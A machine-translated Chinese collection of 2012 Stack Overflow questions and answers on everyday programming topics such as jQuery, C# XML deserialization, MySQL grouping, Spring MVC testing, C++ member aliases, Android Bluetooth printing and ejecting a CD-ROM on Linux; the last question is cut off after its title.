
> 赞同：0
> 
> 时间：2012-07-27T13:18:46.933

你试试这个..

类名用于隐藏/显示功能

```
$('.total').hide();
$('.total').show(); 
```

或者

```
$('.total').toggle(); 
```

我检查过...

```
<script type="text/javascript" src="js/jquery.js"></script>
<script type="text/javascript">
function show()
{

$('.total').toggle();

}
</script>
<table>
<tr class="row">
  <td class="tcol1">New</td>
  <td class="tcol2">Jan</td>
  <td class="tcol3">Feb</td>
  <td class="total">Total</td>
</tr>
</table>
<input type='button' value='new' id='new' onclick='show()'> 
```

# c# - 使用 XSD/代码生成的 XML 反序列化 - 解析错误

> ID：11651260
> 
> 赞同：2
> 
> 时间：2012-07-25T13:50:02.757
> 
> 标签：c#, .net, xml, xsd, xml-deserialization

我正在尝试使用 XSD 反序列化 XML 文档。我得到的错误是：

> “XML 文档 (22, 8) 中存在错误。”

`InnerException`是_

> “输入字符串的格式不正确。”

现在，我的示例 XML 文档的第 22 行只有以下内容：

```
<PremiumPaymentDate>2012-08-08</PremiumPaymentDate> 
```

据我所知，这没有什么问题。XSD 指定此行的方式类似：

```
<xs:element name="PremiumPaymentDate" type="xs:date" minOccurs="0"/> 
```

它试图映射到的属性如下所示：

```
[System.Xml.Serialization.XmlElementAttribute(Form=System.Xml.Schema.XmlSchemaForm.Unqualified, DataType="date")]
public System.DateTime PremiumPaymentDate {
    get {
        return this.premiumPaymentDateField;
    }
    set {
        this.premiumPaymentDateField = value;
    }
} 
```

我已经尝试完全删除该字段，从 XSD 重新生成代码文件，更改 XSD，更改`minOccurs`值，更改字段格式，完全删除字段数据，但没有任何效果。

我还想知道为什么在第 22 行之前一切都正常，因为它们比这个高出大约 17 个字段可以正常工作，其中一些是以完全相同的方式设置的日期。这个只是出于某种原因不想解析。

编辑：

这些日期有效。这些都高于文件中所讨论的日期。这是适用的 XSD：

```
<xs:element name="effectivedate" type="xs:date" minOccurs="1"/> 
```

这是相同的示例 XML：

```
<effectivedate>2012-06-08</effectivedate> 
```

以及它的代码属性：

```
[System.Xml.Serialization.XmlElementAttribute(Form=System.Xml.Schema.XmlSchemaForm.Unqualified, DataType="date")]
        public System.DateTime effectivedate {
            get {
                return this.effectivedateField;
            }
            set {
                this.effectivedateField = value;
            }
        } 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-19T17:52:11.900

你能检查前一个节点是否存在吗？

错误可能不在此节点中，但您的架构期望在此节点之前出现其他节点，但它不存在。

例如，如果您的 xsd 低于

```
...
<xs:element name="someelsenode" type="xs:date" minOccurs="1"/>
<xs:element name="missingnode" type="xs:date" minOccurs="1"/>
<xs:element name="effectivedate" type="xs:date" minOccurs="1"/>
... 
```

但您的 xml 如下所示

```
...
<someelsenode>2012-06-08</someelsenode>
<effectivedate>2012-06-08</effectivedate>
... 
```

然后你会得到“XML 文档中存在错误 (22, 8)”。错误。这将引用正确的节点行和列，但实际上它想说的是另一个节点不存在。

所以之前`<effectivedate>2012-06-08</effectivedate>`必须有`<missingnode>2012-06-08</missingnode>`

# php - 如何在 PHP 变量中保存电脑的时间

> ID：11651261
> 
> 赞同：-1
> 
> 时间：2012-07-25T13:50:04.613
> 
> 标签：php, javascript

我应该如何将电脑的时间（不是服务器时间）保存在 PHP 变量中？我试过了

```
$a='<script type="text/javascript"> document.write(Date()) </script>'; 
```

没有运气

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-25T13:51:39.750

这样做的唯一方法是通过表单或查询将其发送到 PHP 脚本。所有 PHP 都在服务器上执行并发送给任何请求它的人。必须将 PC 时间发送回服务器才能知道它是什么。

编辑：如果您只想使用 javascript 显示当前 PC 时间，您可以在代码中回显：

```
<script language="javascript">
<!--
  var today = new Date();
  document.write(today);
//-->
</script> 
```

在 PHP 中它将是：

```
$timeString='

<script language="javascript">
<!--
  var today = new Date();
  document.write(today);
//-->
</script>
';
echo $timeString; 
```

它将在客户端 PC 上显示为*Thu Jul 26 2012 00:17:43 GMT+1000 (EST) 。*这是一个关于如何使用 javascript 根据用户 PC 显示日期、时间和各种其他好东西的[体面教程的链接。](http://www.quackit.com/javascript/tutorial/javascript_date_and_time.cfm)

编辑 2：这个 Javascript 将很好地显示日期和时间。

```
<script type="text/javascript">
<!--
var d = new Date();
var curr_date = d.getDate();
var curr_month = d.getMonth();
curr_month++;
var curr_year = d.getFullYear();
var curr_hour = d.getHours();
var curr_min = d.getMinutes();
document.write(curr_month + "/" + curr_date + "/" + curr_year + " - " + curr_hour + ":" + curr_min);
//-->
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T13:56:17.900

您可以在客户端使用 ajax 向您的服务器端代码发送日期。然后服务器可以做它需要的事情并将更新的信息发送回服务器端，也可以通过 ajax。这是您的服务器端代码无需回发即可获得客户端 dateTime 的唯一方法。

有帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T13:58:25.130

我会使用 javascript Date 对象 (http://www.w3schools.com/jsref/jsref_obj_date.asp) 从客户端机器中获取日期，然后通过 AJAX 将其传递给 php 脚本。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-25T14:05:47.767

正如其他人所提到的，您可以使用 AJAX 来做到这一点。但一个更重要的问题是你能相信客户的日期/时间吗？为什么你需要客户机器上的时间/日期？此外，由于服务器、客户端和中间网络的负载，您将无法获得准确的时间。

只信任服务器上的时间/日期会更好吗？只需记下时区并据此执行更正。

# javascript - 如何更改 ExtJs 组合框中的显示消息？

> ID：11651263
> 
> 赞同：3
> 
> 时间：2012-07-25T13:50:05.723
> 
> 标签：javascript, extjs, combobox, extjs4, multi-select

我有一个带有多个 true 的 ExtJs 组合框，我想在输入字段上显示“选择的 X 值”而不是“值 1，值 2，值 3”。我尝试使用选择侦听器，但是当我将值设置为输入字段然后调用 multicombo.getValue() 时，它会从输入字段中获取值。我需要一些东西，比如从 valueField （隐藏输入）中获取值。

我的代码：

```
var multiCombo = Ext.create('Ext.form.field.ComboBox', {
    renderTo: item.id,
    multiSelect: true,
    displayField: 'name',
    editable: false,
    valueField: 'id',
    emptyText: 'Select',
    hiddenName: 'data[Model][' + item.getAttribute('question-id') + '][value]',
    submitValue: true,
    inputType: 'hidden',
    value: selectedOptions,
    width: 300,
    store: store,
    queryMode: 'local',
    listeners: {
        expand: function (combo) {
            var values = Ext.get(combo.hiddenDataEl.dom.lastChild).dom.value;
            values = values.split(",");
            Ext.each(values, function (value, i) {
                values[i] = parseInt(value);
            });
            combo.setValue(values);
            Ext.get(combo.getInputId()).dom.value = values.length + ' selected';
        },
        select: function (combo, values) {
            if (values[values.length - 1].data.id === parseInt(item.getAttribute('not-applicable'))) {
                combo.setValue(parseInt(item.getAttribute('not-applicable')));
            } else {
                var notApplicable = -1;
                var newValues = combo.getValue();
                if ((notApplicable = combo.getValue().indexOf(parseInt(item.getAttribute('not-applicable')))) != -1) {
                    newValues.splice(notApplicable, 1);
                }
                combo.setValue(newValues);
            }
            Ext.get(combo.hiddenDataEl.dom.lastChild).dom.value = combo.getValue().join(',');
            optionsSelected = combo.getValue();
            Ext.get(combo.getInputId()).dom.value = optionsSelected.length + ' selected';
        },
        change: function (combo) {
            if (item.getAttribute('required') == 'true') {
                if (combo.getValue().length == 0) {
                    question.findParentNode('li', 1, true).addCls("is_required");
                } else {
                    question.findParentNode('li', 1, true).removeCls("is_required");
                }
                //There is no ExtJs equivalent for this
                $('#' + combo.getInputId()).keyup();
            }
        }

    }
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T16:38:47.387

我不确定我是否遵循所有事件处理程序的情况（所以我可能会遗漏一些东西），但实现您在上面第一句话中描述的最简单方法是为组合提供您自己的实现`getDisplayValue`方法。[这](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.form.field.ComboBox-method-getDisplayValue)是在文档中。

只需将其设置为返回选择了多少值的计数。这是一个例子：

```
var multiCombo = Ext.create('Ext.form.field.ComboBox', {
    renderTo: item.id,
    multiSelect: true,
    displayField: 'name',

    // your own getDisplayValue implementation
    getDisplayValue: function() {
        return multiCombo.value.length + ' values selected';
    },

    editable: false,
    valueField: 'id',
    emptyText: 'Select',
    hiddenName: 'data[Model][' + item.getAttribute('question-id') + '][value]',
    submitValue: true,
    inputType: 'hidden',
    value: selectedOptions,
    width: 300,
    store: store,
    queryMode: 'local',
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-05-21T09:48:40.883

这也可能有帮助：

```
getDisplayValue: function() {
            return (this.displayTplData.length > 1) ? this.displayTplData.length + ' selected' : this.displayTplData[0].name;
        }, 
```

# mysql - MySQL groupwise max 按字段的长度

> ID：11651264
> 
> 赞同：1
> 
> 时间：2012-07-25T13:50:08.087
> 
> 标签：mysql, sql, groupwise-maximum

`Product`桌子：

```
id: int
name: varchar(255)
info: varchar(8000) 
```

我需要获取按名称分组的所有产品的列表，如果某些产品具有相同的名称，`info`则应选择字段中数据最多的产品来显示。另一个要求是一致性——应该保证每次都展示相同的产品。但是性能根本不是我关心的。

所以到目前为止我想出的最好的是：

```
select * from (select * from product order by length(info) desc) as product group by name 
```

我的理解是这*应该*在 MySQL 中工作，但不能保证结果。

有没有更好的办法？

更新：

我正在寻找的一个例子。如果数据是

```
1, 'Product1', '12345'
2, 'Product1', '123'
3, 'Product2', '123456'
4, 'Product2', '123456'
5, 'Product2', '12' 
```

预期结果应该是：

```
1, 'Product1', '12345'
3, 'Product2', '123456' 
```

或者

```
1, 'Product1', '12345'
4, 'Product2', '123456' 
```

我不在乎两者中的哪一个，只要每次运行查询时结果相同即可。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T13:54:51.510

我认为您需要加入：

```
select p.*
from product p join
     (select p.name, max(len(info)) as maxinfolen
      from product p
      group by p.name
     ) t
     on p.name = t.name and
        len(p.info) = t.maxinfolen 
```

如果最大长度在信息中重复，这将返回重复项。要消除重复项，您可以在外部进行分组：

```
select p.name, max(info)
from product p join
     (select p.name, max(len(info)) as maxinfolen
      from product p
      group by p.name
     ) t
     on p.name = t.name and
        len(p.info) = t.maxinfolen
group by p.name 
```

如果您每次都尝试选择相同的 id，您可以使用相同的想法：

```
select p.*
from product p join
     (select p.name, min(id) as minid
      from product p join
           (select p.name, max(len(info)) as maxinfolen
            from product p
            group by p.name
           ) t
           on p.name = t.name and
              len(p.info) = t.maxinfolen
      group by p.name
     ) t
     on p.name = t.name and
        p.id = t.minid 
```

# spring - 使用 Spring 和 test-mvc 时如何验证 Web 响应

> ID：11651267
> 
> 赞同：1
> 
> 时间：2012-07-25T13:50:15.427
> 
> 标签：spring, unit-testing, spring-test-mvc

关于如何使用 test-mvc 进行单元测试的问题。

我有一个简单的控制器：

```
@Controller
@RequestMapping("/users")
public class UserController {        
    private UserService business;
    @Autowired
    public UserController(UserService bus)
    {
        business = bus;
    }
    @RequestMapping(value="{id}", method = RequestMethod.GET)
    public @ResponseBody User getUserById(@PathVariable String id) throws ItemNotFoundException{

        return business.GetUserById(id);

    } 
```

（（（我的想法是让控制器尽可能的薄。））

为了测试这个控制器，我正在尝试做这样的事情。

```
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations = { "classpath:mvc-dispatcher-servlet.xml"})
public class UserControllerTest extends ControllerTestBase {

UserService mockedService;

@Before
public void Setup()
{

    MockitoAnnotations.initMocks( this );   
    mockedService = mock(UserService.class);

}

@Test
public void ReturnUserById() throws Exception{

    User user = new User();
    user.setName("Lasse");

    stub(mockedService.GetUserById("lasse")).toReturn(user);

    MockMvcBuilders.standaloneSetup(new UserController(mockedService)).build()
    .perform(get("/users/lasse"))
    .andExpect(status().isOk())
    .andExpect(?????????????????????????????);

} 
```

我的目的是检查是否返回了正确的 json 代码，，，，，，

我不是亲，，，所以我还没有找到方法来代替??????????????????????????? 用代码来验证返回的字符串，但我确信必须有一种优雅的方式来做到这一点

谁能给我填？

//lg

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-25T14:20:07.747

```
content().string(containsString("some part of the string")) 
```

假设您有此导入：

```
import static org.springframework.test.web.server.result.MockMvcResultMatchers.*; 
```

更新：也根据您的评论添加 jsonPath：

您可以向[json-path](http://code.google.com/p/json-path/)添加依赖项，但 1.0.M1 似乎依赖于更旧版本的 json-path ：

```
 <dependency>
        <groupId>com.jayway.jsonpath</groupId>
        <artifactId>json-path</artifactId>
        <version>0.5.5</version>
        <scope>test</scope>
    </dependency> 
```

有了这个，您的测试可以如下所示：

```
.andExpect(jsonPath("$.persons[0].first").value("firstName")); 
```

# php - 字数计数器：似乎没有给出我需要的输出（PHP）

> ID：11651271
> 
> 赞同：1
> 
> 时间：2012-07-25T13:50:21.057
> 
> 标签：php

这是我想出的代码行：

```
function Count($text)
        {    
            $WordCount = str_word_count($text);         

            $TextToArray = explode(" ", $text);
            $TextToArray2 = explode(" ", $text);

            for($i=0; $i<$WordCount; $i++)
            {
                $count = substr_count($TextToArray2[$i], $text);
            }
            echo "Number of {$TextToArray2[$i]} is {$count}";                                                   
        } 
```

所以，这里会发生的是，用户将输入文本、句子或段落。通过使用 substr_count，我想知道单词在数组中出现的次数。不幸的是，输出并不是我真正需要的。有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T13:56:30.590

我假设您想要一个带有单词频率的数组。

首先，将字符串转换为小写并从文本中删除所有标点符号。这样，您将不会获得“但是”、“但是”和“但是”的条目，而只会获得具有 3 次或更多用途的“但是”。

其次，使用`str_word_count`马克贝克所说的第二个参数 2 来获取文本中的单词列表。这可能比我对 preg_split 的建议更有效。

然后遍历数组并将单词的值加一。

```
foreach($words as $word)
  $output[$word] = isset($output[$word]) ? $output[$word] + 1 : 1; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:02:52.903

```
$WordCounts = array_count_values(str_word_count(strtolower($text),2));
var_dump($WordCounts); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T13:58:16.603

如果我正确理解了您的问题，这也应该可以解决您的问题

```
function Count($text) {
   $TextToArray = explode(" ", $text); // get all space separated words
   foreach($TextToArray as $needle) {
     $count = substr_count($text, $needle); // Get count of a word in the whole text
     echo "$needle has occured  $count times in the text";
   }
} 
```

# c# - 不使用方法名调用方法

> ID：11651290
> 
> 赞同：1
> 
> 时间：2012-07-25T13:51:17.527
> 
> 标签：c#

我最近看到了一些这样的代码（它正在调用委托）：

```
public IMethodReturn Invoke(IMethodInvocation input, GetNextHandlerDelegate getNext)
{
    Debug.WriteLine(string.Format("Second watch: Method '{0}' on object '{1}' was invoked  and caught in order {2}.", input.MethodBase.Name, input.Target.GetType(),Order));
    return getNext()(input, getNext);

} 
```

有人可以解释和\或发布一个链接来解释这里发生的事情。我知道正在调用 Invoke() 但为什么在这种情况下名称是可选的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T13:55:40.410

GetNextHandler 似乎是一个返回委托的委托。

因此调用它会产生一个委托，然后使用两个参数调用它。

```
 public delegate void FooDelegate( int n );
 public delegate FooDelegate GetFooDelegate();

 public void Bar( GetFooDelegate getFoo ) {

      getFoo()( 5 );

 } 
```

# android - 在销售队伍的列表视图中显示数据？

> ID：11651294
> 
> 赞同：-1
> 
> 时间：2012-07-25T13:51:26.713
> 
> 标签：android, android-listview, salesforce

我是 Sales Force 的新手，我想根据我的 Sales Force 对象数据在 Android 程序中显示列表，我完成了以下步骤：

基于回调和消费者密钥，我成功登录 API。我浏览了跟踪版本中的所有控件

我如何在 Android 程序中显示项目列表是否有任何示例程序可以在 Android 列表视图中获取和显示数据。请向我发送任何有用的链接以实现此目的。

提前致谢.....

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:07:38.440

如果要使用 ListView 显示项目列表。可以编写一个扩展 BaseAdapter 的 DataAdapter，在构造函数方法中，将要显示的数据设置为参数。然后覆盖 getView() 方法，您将使项目显示。

关键词：ListActivity、BaseAdapter。

# c++ - 类引用成员指向同一类中的其他成员

> ID：11651300
> 
> 赞同：5
> 
> 时间：2012-07-25T13:51:52.393
> 
> 标签：c++, reference, compiler-optimization

我正在制作一个涉及 3-D 坐标的库，并发现 3-D 角度的组件有两个名称：yaw-pitch-roll 和 heading-elevation-bank

所以我做了以下（在c ++ 11中完成）：

```
struct Angle {
    float heading;
    float elevation;
    float bank;
    float &yaw = heading;
    float &pitch = elevation;
    float &roll = bank;

     // Some Constructors (copy and assignment have to be made manually)
 } 
```

这样做的好处是在两个名称方案之间保持符号等效。例如：

```
Angle angle;
rotate(angle.yaw); // this is equivalent to rotate(angle.heading) 
```

我想知道编译器是否会发现引用是不必要的，或者是否会将指针保留在结构中。

另外，有没有更好的方法让一个成员有两个名字？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:08:46.757

> 我想知道编译器是否会发现引用是不必要的，或者是否会将指针保留在结构中。

在 99.9% 的情况下，指针将保留在结构中。我看不到编译器可以通过翻译单元将它们排除在外。Esp，因为您的语法无效，并且您必须初始化构造函数中的引用，这很可能被隐藏。所以它没有办法知道哪个参考引用了哪个成员。

也可能有一些性能开销。例如：

```
 float x = a.elevation;
013F13E0  fld         dword ptr [ebp-18h] 
013F13E3  fstp        dword ptr [x] 
  float y = a.pitch;
013F13E6  mov         eax,dword ptr [ebp-0Ch] 
013F13E9  fld         dword ptr [eax] 
013F13EB  fstp        dword ptr [y] 
```

实际上，在内部，引用就像指针一样。所以额外的`mov`弥补了取消引用该指针。

不过我不会担心它，而是会关心风格。让两个成员负责同一件事……似乎是错误的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T15:17:20.073

我可以想到两种不同的选择。第一个几乎是@Neal 已经建议的，但包括真正的C++ 代码：

```
struct Angle {
    float heading;
    float elevation;
    float bank;

    float& yaw() { return heading; }
    float& pitch() { return elevation; }
    float& roll() { return bank; }

    const float& yaw() const { return heading; }
    const float& pitch() const { return elevation; }
    const float& roll() const { return bank; }
}; 
```

第一组方法返回非常量引用，因此可以通过这些方法实际修改结构的属性。例如：

```
Angle a{60, 45, 0};
a.roll() = 15; 
```

当你有一个对角度的常量引用并且你只想读取结构中的值时，使用第二组。例如：

```
void print_yaw(const Angle& a) {
    std::cout << "yaw=" << a.yaw() << std::endl;
} 
```

我检查了 GCC 生成的汇编代码。直接使用结构属性（例如，`a.heading`）和使用别名方法（例如，`a.yaw()`）都会生成相同的汇编代码，因此您无需为使用别名方法付出任何代价。

我能想到的第二种方法是使用完全不同的方法。像这样的东西：

```
enum Accessors { HEADING=0, ELEVATION, BANK };
enum AliasedAccessors { YAW=0, PITCH, ROLL };
typedef float Angle[3];

Angle a{60, 45, 0};
std::cout << a[HEADING] << " must be equal to " << a[YAW] << std::endl; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T13:55:56.993

为什么要制作这么多公共变量？

你可以只做一些getter和setter（伪代码）：

```
struct Angle {
    float heading;
    float elevation;
    float bank;

    float& yaw() const  {
         return heading;
    }
    float& pitch() const  {
         return elevation;
    }
    float& roll() const  {
         return bank;
    }

    //etc...

    // Some Constructors (copy and assignment have to be made manually)
 } 
```

# c - time function in C

> ID：11651303
> 
> 赞同：1
> 
> 时间：2012-07-25T13:51:58.400
> 
> 标签：c, datetime, time

In shell scripting, when ever I want the local time I do something like

```
date +%s 
```

from the command line and it returns me the current date and time in this format "1343221713"

I am wondering whether there is a way to achieve the same result in C

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-25T13:54:47.110

Use time.h library in C

example:

```
#include <stdio.h>
#include <time.h>

int main()
{
    /* Obtain current time as seconds elapsed since the Epoch. */
    time_t clock = time(NULL);

    /* Convert to local time format and print to stdout. */
    printf("Current time is %s", ctime(&clock));
    return 0;
} 
```

see more examples: [http://en.wikipedia.org/wiki/C_date_and_time_functions](http://en.wikipedia.org/wiki/C_date_and_time_functions)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-25T14:14:12.350

More flexible than `time(3)` is `gettimeofday(3)` as declared in `sys/time.h`

```
#include <sys/time.h>
#include <stdio.h>
int main(void)
{
        struct timeval tv = {0};
        gettimeofday(&tv, NULL);
        printf("seconds since epoch %ld, microseconds %ld\n", tv.tv_sec, tv.tv_usec);
        return 0;
} 
```

# html - HTML5 Canvas - 视网膜显示器上纵向和横向的性能差异

> ID：11651304
> 
> 赞同：2
> 
> 时间：2012-07-25T13:51:58.923
> 
> 标签：html, web-applications, canvas, retina-display, ipad-3

我们正在使用缩放技术来提高我们的画布 Web 应用程序在视网膜显示器上的分辨率。基本上，这里描述的技术：

[http://zsprawl.com/iOS/2012/03/html5-canvas-and-retina-displays/](http://zsprawl.com/iOS/2012/03/html5-canvas-and-retina-displays/)

但是，我们注意到在横向模式与纵向模式下运行时的显着性能差异。我已经设置了一个 jsFiddle 测试应用程序来演示这一点。如果您查看嵌入式版本，您会注意到差异：

[http://jsfiddle.net/SaJ69/embedded/result/](http://jsfiddle.net/SaJ69/embedded/result/)

（删除 /embedded/result/ 会将您带到原始小提琴。我只能有一个包含 2 个链接的帖子）

如果您在 iPad3 上查看此内容时在纵向和横向之间切换（您需要在切换之间刷新浏览器窗口），您会发现纵向模式比横向模式更不稳定。在我自己的网络服务器上运行它（而不是通过 jsFiddle），结果更加明显。

我试图做一些帧率指标，但它们只是测量我们进行绘图调用的次数，而不是浏览器实际更新的次数。

有人对此有任何见解吗？这是与硬件相关的问题吗？从理论上讲，我们正在执行相同的绘制调用并填充相同数量的像素，对吗？

-克里斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-17T15:24:26.930

似乎一种可行的解决方法是将画布宽度固定为 1023，使双密度画布的宽度为 2046 像素；由 Arima 发现并在此处解释： [http ://www.scirra.com/forum/retina-ios-performance-problem-fix-please-test_topic58742.html](http://www.scirra.com/forum/retina-ios-performance-problem-fix-please-test_topic58742.html)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-01-11T15:57:26.353

我也遇到了横向与纵向的相同问题。这也发生在 iPhone 4、4s 和 5 上 -涉及 Retina 和双密度帆布的*任何地方。*我唯一的解决方法是在 Apple 解决问题之前不要使用双密度技巧。

*但是*，如果您决定使用 Retina，您可以检测设备的方向并仅在横向调整画布大小以实现双密度...

# android - Android 上的蓝牙三星 Galaxy XCover 总是成功

> ID：11651311
> 
> 赞同：1
> 
> 时间：2012-07-25T13:52:20.183
> 
> 标签：android, bluetooth

我的安卓蓝牙连接有点问题。我正在使用蓝牙在 Zebra MZ320 打印机上进行打印。到目前为止，我的任何手机都没有任何问题（在三星 Galaxy Mini、三星 Galaxy Ace、三星 Galaxy Nexus S、三星 Galaxy S2、三星 Galaxy Nexus S、三星 Galaxy Note、HTC Desire Z 上打印没有任何问题， HTC Desire S、HTC Desire、HTC Legend、HTC Flyer、三星 Galaxy Tab），但最近我得到了无法打印的三星 Galaxy XCover。

经过一天的研究，我做了这个程序：

```
/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.main);
  Button bTest = (Button)findViewById(R.id.button1);
  bTest.setOnClickListener(new OnClickListener() {
    @Override
    public void onClick(View v) {
      if (new File("/sdcard/logDat.txt").exists()) {
        new File("/sdcard/logDat.txt").delete();
      }
      Toast.makeText(TestPrinterActivity.this, "abcd1234", Toast.LENGTH_SHORT).show();
      String macAddr = "00:22:58:07:BD:A5";
      //sendCpclOverBluetooth(macAddr);
      BluetoothSocket bSocket = null;
      OutputStream outStream = null;
      InputStream inStream = null;
      try {
        log("try... \tMAC address: "+macAddr);
        BluetoothDevice device = BluetoothAdapter.getDefaultAdapter().getRemoteDevice(macAddr);
        Method m = device.getClass().getMethod("createRfcommSocket", new Class[] { Integer.TYPE });
        //Method m = device.getClass().getMethod("createInsecureRfcommSocket", new Class[] { Integer.TYPE });
        bSocket = (BluetoothSocket)m.invoke(device, new Object[] { Integer.valueOf(1) });
        //bSocket = BluetoothAdapter.getDefaultAdapter().getRemoteDevice(macAddr).createRfcommSocketToServiceRecord(UUID.fromString("00001101-0000-1000-8000-00805F9B34FB"));
        //bSocket = BluetoothAdapter.getDefaultAdapter().getRemoteDevice(macAddr).createInsecureRfcommSocketToServiceRecord(UUID.fromString("00001101-0000-1000-8000-00805F9B34FB"));
        log("\tconnect()");
        bSocket.connect();
        log("\tgetOutputStream");
        outStream = bSocket.getOutputStream();
        log("\tgetInputStream");
        inStream = bSocket.getInputStream();
        String cpclData = "! U1 SETLP ARI08ITA.CPF 0 20\r\n test123\r\n";
        // Send the data to printer as a byte array.
        log("\twriting: "+cpclData);
        outStream.write(cpclData.getBytes());
        log("\tflush");
        outStream.flush();
        Sleeper.sleep(1000);
        log("\tfinish1");
      } catch (Exception e) {
        log("\t\tERROR: "+e.getMessage());
        e.printStackTrace();
        Toast.makeText(TestPrinterActivity.this, "ERROR: "+e.getMessage(), Toast.LENGTH_SHORT).show();
      } finally {
        try {
          log("\tbSocket.close");
          bSocket.close();
          log("\toutStream.close");
          outStream.close();
          log("\tinStream.close");
          inStream.close();
        } catch (Exception e) {
          log("\t\tERROR while closing: "+e.getMessage());
          e.printStackTrace();
          Toast.makeText(TestPrinterActivity.this, "ERROR while closing: "+e.getMessage(), Toast.LENGTH_SHORT).show();
        }
      }
      log("endTry");
    }
  });
}

private void log(String str) {
  if (Environment.getExternalStorageState().equals( Environment.MEDIA_MOUNTED ) == false)
    return;
  try {
    BufferedWriter buffWr = new BufferedWriter(new FileWriter("/sdcard/logDat.txt", true));
    buffWr.write(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + ": "+ str);
    buffWr.newLine();
    buffWr.close();
  } catch(Exception e) {
    Toast.makeText(TestPrinterActivity.this, "ERROR writing to log file: "+e, Toast.LENGTH_SHORT).show();
  }
} 
```

以下是正确和错误的输出。每个输出包含两个场景（打印机打开和关闭）。

似乎在三星 Galaxy XCover 蓝牙上总是成功连接到打印机，即使它处于脱机状态......

任何建议做什么/尝试将不胜感激。

```
---------------------------------------------------------------------
  When printer is turned on:
---------------------------------------------------------------------
2012-07-25 14:53:36: try...     MAC address: 00:22:58:07:BD:A5
2012-07-25 14:53:36:    connect()
2012-07-25 14:53:43:    getOutputStream
2012-07-25 14:53:43:    getInputStream
2012-07-25 14:53:43:    writing: ! U1 SETLP ARI08ITA.CPF 0 20
  test123

2012-07-25 14:53:43:    flush
2012-07-25 14:53:44:    finish1
2012-07-25 14:53:44:    bSocket.close
2012-07-25 14:53:44:    outStream.close
2012-07-25 14:53:44:    inStream.close
2012-07-25 14:53:44: endTry

---------------------------------------------------------------------
  When printer is off
---------------------------------------------------------------------
2012-07-25 14:53:07: try...     MAC address: 00:22:58:07:BD:A5
2012-07-25 14:53:07:    connect()
2012-07-25 14:53:12:        ERROR: Host is down
2012-07-25 14:53:12:    bSocket.close
2012-07-25 14:53:12:    outStream.close
2012-07-25 14:53:12:        ERROR while closing: null
2012-07-25 14:53:12: endTry

Output from Samsung Galaxy XCover (2.3.6):
---------------------------------------------------------------------
  When printer is turned on:
---------------------------------------------------------------------
2012-07-25 15:00:48: try...     MAC address: 00:22:58:07:BD:A5
2012-07-25 15:00:48:    connect()
2012-07-25 15:00:48:    getOutputStream
2012-07-25 15:00:48:    getInputStream
2012-07-25 15:00:48:    writing: ! U1 SETLP ARI08ITA.CPF 0 20
  test123

2012-07-25 15:00:48:    flush
2012-07-25 15:00:49:    finish1
2012-07-25 15:00:49:    bSocket.close
2012-07-25 15:00:49:    outStream.close
2012-07-25 15:00:49:    inStream.close
2012-07-25 15:00:49: endTry

---------------------------------------------------------------------
  When printer is off
---------------------------------------------------------------------
2012-07-25 15:01:25: try...     MAC address: 00:22:58:07:BD:A5
2012-07-25 15:01:25:    connect()
2012-07-25 15:01:25:    getOutputStream
2012-07-25 15:01:25:    getInputStream
2012-07-25 15:01:25:    writing: ! U1 SETLP ARI08ITA.CPF 0 20
  test123

2012-07-25 15:01:25:    flush
2012-07-25 15:01:26:    finish1
2012-07-25 15:01:26:    bSocket.close
2012-07-25 15:01:26:    outStream.close
2012-07-25 15:01:26:    inStream.close
2012-07-25 15:01:26: endTry 
```

# linux - 应用程序安装后弹出 CD-ROM 驱动器

> ID：11651316
> 
> 赞同：1
> 
> 时间：2012-07-25T13:52:37.353
> 
> 标签：linux, installation

我在 Linux 中有一个从 CD-ROM 设备安装的应用程序。

将 CD-ROM 插入驱动器后，自动运行功能会在 xterm 窗口中运行安装脚本。现在，当安装结束时，我执行 'exit 1' ，xterm 窗口提示用户“按任意键关闭窗口”。我的问题是我希望脚本在安装结束后弹出 CD-ROM 驱动器。

但是，由于安装脚本仍在 CD-ROM 驱动器上运行，因此该脚本无法卸载 CD-ROM 驱动器并弹出驱动器。

任何人都可以给我一些关于脚本如何在安装后弹出 CD 驱动器的想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T13:55:43.920

您可以使用引用 CD 上的安装文件的本地安装脚本。这确实意味着您的用户必须在本地复制文件才能开始运行安装程序。

另一种选择可能是您的安装程序可以在用户从 CD 启动安装过程时创建补充安装文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T13:59:58.423

在安装程序启动之前，将安装程序和“弹出 CD”shell 脚本复制到`/tmp`Linux 机器上的目录中。然后，执行安装程序`/tmp`并创建一个 shell 脚本来执行或找到执行以下命令的方法：

```
sudo umount /dev/cdrom
eject /dev/cdrom 
```

此外，在某些机器上它是`sudo umount /dev/sr0`，但`/dev/cdrom` *应该可以*工作。

# ruby-on-rails-3.2 - Authorize.net CIM Active Merchant -- 由于验证值无效，用户验证失败

> ID：11651318
> 
> 赞同：0
> 
> 时间：2012-07-25T13:52:42.133
